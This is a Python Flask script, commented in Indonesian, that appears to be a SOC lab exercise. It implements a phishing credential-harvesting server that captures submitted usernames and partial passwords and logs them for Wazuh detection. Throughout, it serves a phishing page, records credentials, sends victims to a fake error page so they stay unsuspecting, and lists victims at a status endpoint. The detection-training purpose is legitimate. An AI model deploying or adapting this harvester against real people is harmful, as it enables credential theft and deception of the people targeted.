#!/usr/bin/env python3
"""
=============================================================
SOC Lab — Social Engineering Scenario
Phishing Credential Harvester Server
=============================================================
DISCLAIMER: Script ini hanya untuk keperluan edukasi dan lab
SOC Final Project. Jangan digunakan di luar lingkungan lab.
=============================================================

Cara jalankan:
    python3 phishing_server.py

Server akan listen di port 8080.
Semua credential yang disubmit akan di-log ke:
  - /var/log/phishing_harvest.log   (untuk Wazuh)
  - ./harvest_local.log             (backup lokal)

Wazuh Rules yang akan terpicu:
  - Rule 100023: Credential submission detected
  - Rule 100025: Phishing credential harvested
"""

from flask import Flask, request, jsonify, redirect
import logging
import datetime
import json
import os
import subprocess
import socket

app = Flask(__name__, static_folder='.', static_url_path='')

# ── Logging Setup ──────────────────────────────────────────
LOG_FILE = '/var/log/phishing_harvest.log'
LOCAL_LOG = './harvest_local.log'

def log_event(event_type, data):
    """Log event ke file yang dimonitor Wazuh dan juga ke syslog"""
    timestamp = datetime.datetime.utcnow().isoformat() + 'Z'
    entry = {
        "timestamp": timestamp,
        "event_type": event_type,
        "source_ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', 'unknown'),
        **data
    }
    line = json.dumps(entry)

    # Tulis ke log file lokal
    with open(LOCAL_LOG, 'a') as f:
        f.write(line + '\n')

    # Tulis ke system log (agar Wazuh bisa detect via /var/log/syslog)
    try:
        subprocess.run(
            ['logger', '-t', 'PHISHING_ALERT', '-p', 'auth.warning', line],
            check=False, timeout=3
        )
    except Exception:
        pass

    # Tulis ke file khusus (jika ada permission)
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except PermissionError:
        pass

    return entry


# ── Routes ─────────────────────────────────────────────────

@app.route('/')
def index():
    """Serve halaman phishing"""
    # Log: ada yang mengunjungi halaman phishing
    log_event("PHISHING_PAGE_VISIT", {
        "action": "page_visit",
        "url": request.url,
        "referrer": request.referrer or "direct"
    })
    with open('index.html', 'r') as f:
        return f.read()


@app.route('/login', methods=['POST'])
def harvest_credentials():
    """Tangkap credential yang disubmit"""
    username = request.form.get('username', '') or request.json.get('username', '') if request.is_json else request.form.get('username', '')
    password = request.form.get('password', '') or ''

    # Log dengan severity tinggi — ini yang Wazuh detect
    log_event("CREDENTIAL_HARVESTED", {
        "action": "credential_submit",
        "username": username,
        "password_length": len(password),
        "password_masked": '*' * len(password),
        # Log 4 karakter pertama untuk demo (masih aman utk lab)
        "password_hint": password[:4] + '***' if len(password) > 4 else '***',
        "severity": "HIGH",
        "attack_type": "Social Engineering - Phishing"
    })

    # Tambahan log via logger untuk simulasi lebih realistis
    subprocess.run([
        'logger', '-t', 'PHISHING_ALERT', '-p', 'auth.crit',
        f'CREDENTIAL_HARVESTED: user={username} src={request.remote_addr} attack=phishing'
    ], check=False, timeout=3)

    # Redirect ke halaman "error" agar korban tidak curiga
    return redirect('/error')


@app.route('/error')
def error_page():
    """Halaman error palsu setelah credential dicuri"""
    log_event("POST_HARVEST_REDIRECT", {
        "action": "error_redirect",
        "note": "Victim redirected after credential capture"
    })
    with open('error.html', 'r') as f:
        return f.read()


@app.route('/reset-password')
def reset_password():
    """Halaman reset password palsu (social engineering lanjutan)"""
    log_event("PHISHING_RESET_VISIT", {
        "action": "reset_page_visit",
        "note": "Victim visited fake password reset page"
    })
    return redirect('/')


@app.route('/status')
def status():
    """Status endpoint untuk monitoring"""
    try:
        with open(LOCAL_LOG, 'r') as f:
            entries = [json.loads(l) for l in f.readlines() if l.strip()]
        harvested = [e for e in entries if e.get('event_type') == 'CREDENTIAL_HARVESTED']
        return jsonify({
            "status": "running",
            "total_visits": len([e for e in entries if e.get('event_type') == 'PHISHING_PAGE_VISIT']),
            "credentials_harvested": len(harvested),
            "victims": [{"username": e.get("username"), "ip": e.get("source_ip"), "time": e.get("timestamp")} for e in harvested]
        })
    except Exception as e:
        return jsonify({"status": "running", "error": str(e)})


if __name__ == '__main__':
    print("=" * 60)
    print("  SOC Lab — Phishing Server")
    print(f"  Listening: http://0.0.0.0:8080")
    print(f"  Harvest Log: {LOCAL_LOG}")
    print(f"  Syslog Tag: PHISHING_ALERT")
    print("=" * 60)
    app.run(host='0.0.0.0', port=8080, debug=False)
